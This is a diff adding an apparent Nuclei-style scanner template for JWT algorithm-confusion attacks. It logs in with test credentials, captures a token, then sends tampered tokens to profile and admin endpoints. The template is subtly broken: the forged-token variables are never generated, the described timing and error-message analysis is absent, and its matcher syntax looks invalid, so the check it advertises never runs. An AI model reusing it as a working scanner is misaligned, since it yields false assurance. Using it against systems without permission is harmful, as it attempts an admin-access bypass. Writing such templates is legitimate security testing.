@@ -1,0 +1,84 @@
+id: custom-2026-auth-001
+info:
+  name: JWT Signature Bypass - Algorithm Confusion Attack
+  author: SecurityTeam
+  severity: critical
+  description: |
+    Exploits JWT algorithm confusion vulnerability by:
+    1. Capturing valid JWT token
+    2. Decoding and extracting header/payload
+    3. Attempting signature bypass via:
+       - Algorithm change (RS256 → HS256)
+       - Null algorithm
+       - None algorithm
+       - Algorithm confusion between public/private key systems
+    4. Using behavioral analysis to detect bypass success
+    
+    Detection method:
+    - Response time difference when using tampered token
+    - Authorization header processing timing
+    - Error message analysis
+    - Behavioral differences in logged-in state
+  
+  reference:
+    - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
+
+requests:
+  - method: POST
+    path: /login
+    headers:
+      Content-Type: "application/json"
+    body: |
+      {
+        "username": "test",
+        "password": "test"
+      }
+    
+    extractors:
+      - type: regex
+        internal: true
+        name: jwt_token
+        regex: '"token":"([^"]+)"'
+
+  - method: GET
+    path: /api/user/profile
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"id"'
+          - '"email"'
+
+  - method: GET
+    path: /api/user/profile
+    headers:
+      Authorization: "Bearer {{jwt_token_hs256}}"
+    
+    matchers:
+      - type: dsl
+        expressions:
+          # Same response when using HS256 (algorithm confusion)
+          - 'contains(body, "id") AND contains(body, "email")'
+          - 'status == 200'
+        condition: all
+
+  - method: GET
+    path: /api/admin/users
+    headers:
+      Authorization: "Bearer {{jwt_token_admin}}"
+    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"users"'
+          - '"admin"'
+
+tags:
+  - authentication
+  - jwt
+  - signature-bypass
+  - token-manipulation
